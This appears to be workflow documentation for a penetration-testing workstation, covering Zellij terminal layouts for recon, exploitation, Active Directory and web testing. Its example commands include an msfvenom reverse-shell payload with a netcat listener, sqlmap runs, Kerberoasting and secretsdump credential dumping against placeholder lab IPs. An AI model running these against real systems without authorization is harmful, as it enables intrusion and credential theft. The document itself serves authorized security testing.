# Zellij Workflows - offsec-workstation

**Version**: v0.4.2  
**Date**: February 2026

## Overview

Zellij is our terminal multiplexer, replacing tmux. It provides modern features, better discoverability, and seamless container integration.

---

## Quick Start

### Launch with Layout

```bash
# Basic (host system)
zellij --layout ~/.config/zellij/layouts/recon.kdl

# With container (recommended)
./scripts/zellij/zellij-launch.sh web recon
```

### Core Keybinds

| Mode | Key | Action |
|------|-----|--------|
| **Normal** | `Ctrl+p` | Pane mode |
| **Normal** | `Ctrl+t` | Tab mode |
| **Normal** | `Ctrl+n` | Resize mode |
| **Normal** | `Ctrl+h` | Move mode |
| **Normal** | `Ctrl+o` | Session mode |
| **Normal** | `Ctrl+s` | Scroll mode |
| **Normal** | `Ctrl+q` | Quit |
| **Normal** | `Ctrl+g` | Lock/Unlock |
| **Any** | `Alt+n` | New pane |
| **Any** | `Alt+f` | Toggle floating |
| **Any** | `Alt+h/j/k/l` | Navigate panes (Vim-style) |

---

## Layouts

### 1. Recon Layout 🔍

**Purpose**: External reconnaissance and intelligence gathering

**Container**: `offsec-web`

**Usage**:
```bash
./scripts/zellij/zellij-launch.sh web recon
cd /work/target-recon
```

**Tabs**:
- **Scanning** - nmap, masscan, rustscan
- **Web** - gobuster, ffuf, httpx
- **DNS** - dig, subdomain enumeration
- **OSINT** - whois, shodan, passive recon
- **Notes** - Engagement notes

**Workflow**:
1. Start with network scan in "Scanning" tab
2. Discover web services → switch to "Web" tab
3. Enumerate subdomains in "DNS" tab
4. Document findings in "Notes" tab
5. Use `Alt+f` for floating pane quick lookups

**Example Commands**:
```bash
# Scanning tab
nmap -sC -sV -oA nmap/full 10.10.10.10
masscan -p1-65535 10.10.10.0/24 --rate=1000 -oL masscan.txt

# Web tab
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt

# DNS tab
dig @10.10.10.10 example.com ANY
subfinder -d example.com
```

---

### 2. Exploit Layout 💥

**Purpose**: Active exploitation and shell management

**Container**: `offsec-web` or `offsec-re`

**Usage**:
```bash
./scripts/zellij/zellij-launch.sh web exploit
cd /work/target-exploit
```

**Tabs**:
- **Exploit** - Listener, exploit dev, shell
- **Payloads** - msfvenom, payload crafting
- **PrivEsc** - Privilege escalation enumeration
- **Persistence** - Backdoor setup, cron jobs
- **Log** - Command and output logging

**Workflow**:
1. Start listener in top pane: `nc -lvnp 4444`
2. Craft/run exploit in middle pane
3. Get shell in bottom pane
4. Switch to "PrivEsc" tab for enumeration
5. Document in "Log" tab

**Example Commands**:
```bash
# Exploit tab - Listener
nc -lvnp 4444

# Exploit tab - Exploit dev
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > shell.elf
python3 exploit.py --target 10.10.10.10

# PrivEsc tab
./linpeas.sh
find / -perm -4000 2>/dev/null
sudo -l
```

---

### 3. AD Layout 🩸

**Purpose**: Active Directory assessment and exploitation

**Container**: `offsec-ad`

**Usage**:
```bash
./scripts/zellij/zellij-launch.sh ad ad
cd /work/ad-assessment
```

**Tabs**:
- **Enum** - LDAP and SMB enumeration
- **Bloodhound** - Bloodhound GUI and collectors
- **Kerberos** - Kerberoasting, AS-REP roasting
- **Lateral** - PSExec, WMI, lateral movement
- **DA** - DCSync, golden tickets
- **Notes** - Target tracking, credentials

**Workflow**:
1. Enumerate domain in "Enum" tab
2. Run Bloodhound collector → analyze in "Bloodhound" tab
3. Kerberoast SPNs in "Kerberos" tab
4. Lateral movement in "Lateral" tab
5. Domain admin actions in "DA" tab
6. Track progress in "Notes" tab

**Example Commands**:
```bash
# Enum tab
crackmapexec smb 10.10.10.0/24 -u '' -p ''
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10

# Bloodhound tab
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# Kerberos tab
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -request
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.10.10.10

# DA tab
secretsdump.py DOMAIN/Administrator:password@10.10.10.10
```

---

### 4. Web Layout 🌐

**Purpose**: Web application security testing

**Container**: `offsec-web`

**Usage**:
```bash
./scripts/zellij/zellij-launch.sh web web
cd /work/webapp-test
```

**Tabs**:
- **Proxy** - Proxy interaction notes, manual testing
- **SQLi** - SQL injection testing (sqlmap, manual)
- **XSS** - Cross-site scripting tests
- **Auth** - Authentication bypass, JWT analysis
- **Fuzz** - Content discovery fuzzing
- **Upload** - File upload testing
- **API** - API endpoint testing
- **Notes** - Vulnerability tracking

**Workflow**:
1. Proxy traffic through Burp/Caido (running on host)
2. Take notes in "Proxy" tab
3. Test for SQLi in "SQLi" tab
4. Fuzz parameters in "Fuzz" tab
5. Document vulns in "Notes" tab

**Example Commands**:
```bash
# SQLi tab
sqlmap -u "http://10.10.10.10/page?id=1" --dbs --batch
sqlmap -r request.txt --technique=BEUST --dbs

# Fuzz tab
ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt -fc 404
wfuzz -u http://10.10.10.10/page?param=FUZZ -w payloads.txt

# Auth tab
jwt_tool <JWT_TOKEN> -M at
```

---

## Container Integration

### Launch Container with Layout

```bash
# The zellij-launch script automatically:
# 1. Starts the container
# 2. Mounts your work directory
# 3. Launches Zellij with the layout
# 4. Cleans up container on exit

./scripts/zellij/zellij-launch.sh <profile> <layout> [work_dir]
```

### Manual Container Launch

```bash
# Start container
podman run -it --rm \
    -v $PWD:/work \
    --cap-add=NET_RAW \
    localhost/offsec-web:0.1.0

# Inside container, launch Zellij
zellij --layout /path/to/layout.kdl
```

---

## Advanced Usage

### Session Management

```bash
# List sessions
zellij list-sessions

# Attach to session
zellij attach <session-name>

# Create named session
zellij -s engagement-2026-02-21

# Detach (from within Zellij)
Ctrl+o, then 'd'
```

### Custom Layouts

Create custom layouts in `~/.config/zellij/layouts/`:

```kdl
layout {
    tab name="My Tab" {
        pane split_direction="horizontal" {
            pane { name "Left"; }
            pane { name "Right"; }
        }
    }
}
```

### Floating Panes

```bash
# Toggle floating panes
Alt+f

# Open floating file picker
Ctrl+o, then 'f'
```

### Clipboard Integration

Zellij copies to system clipboard automatically. For Wayland:

```bash
# In ~/.config/zellij/config.kdl
copy_command "wl-copy"
```

---

## Tips & Tricks

### Quick Navigation

- `Alt+h/j/k/l` - Vim-style pane navigation
- `Alt+[/]` - Cycle through layouts
- `Alt+n` - New pane in current tab
- `Ctrl+t, n` - New tab

### Pane Management

- `Ctrl+p, d` - New pane below
- `Ctrl+p, r` - New pane to right
- `Ctrl+p, x` - Close pane
- `Ctrl+p, f` - Fullscreen toggle
- `Ctrl+p, z` - Toggle pane frames

### Tab Management

- `Ctrl+t, n` - New tab
- `Ctrl+t, x` - Close tab
- `Ctrl+t, r` - Rename tab
- `Ctrl+t, 1-9` - Jump to tab number
- `Ctrl+t, tab` - Toggle between last two tabs

### Search in Scrollback

- `Ctrl+s` - Enter scroll mode
- `/` or `s` - Search
- `n` - Next match
- `N` - Previous match
- `q` - Exit scroll mode

---

## Comparison: Zellij vs tmux

| Feature | tmux | Zellij |
|---------|------|--------|
| **Config** | Complex `.tmux.conf` | Simple YAML/KDL |
| **Learning Curve** | Steep (prefix keys) | Gentle (on-screen hints) |
| **Layouts** | Manual configuration | Built-in layout system |
| **UI** | Text-based | Modern (tabs, floating) |
| **Plugins** | TPM | Built-in WASM plugins |
| **Session Resurrection** | tmux-resurrect plugin | Built-in |
| **Speed** | Fast (C) | Fast (Rust) |

---

## Troubleshooting

### Zellij not found in container

Install in container or use host Zellij with podman exec:

```bash
# On host
zellij options --simplified-ui true

# Or install in container base image
pacman -S zellij
```

### Layout not loading

Check layout file syntax:

```bash
zellij --check ~/.config/zellij/layouts/recon.kdl
```

### Colors not working

Ensure TERM is set:

```bash
export TERM=xterm-256color
```

### Container cleanup

If containers aren't cleaning up:

```bash
# List all offsec containers
podman ps -a | grep offsec

# Remove stale containers
podman rm $(podman ps -a | grep offsec | awk '{print $1}')
```

---

## Next Steps

- **Custom Plugins**: Phase 6 - Engagement orchestration plugins
- **Layouts**: Create engagement-specific layouts
- **Integration**: Deeper container/tool integration
- **Automation**: Auto-logging, note-taking plugins

---

**Related Documentation**:
- [Container Workflows](CONTAINER.md)
- [OSINT Workflow](OSINT-WORKFLOW.md)
- [Engagement Guide](../README.md)
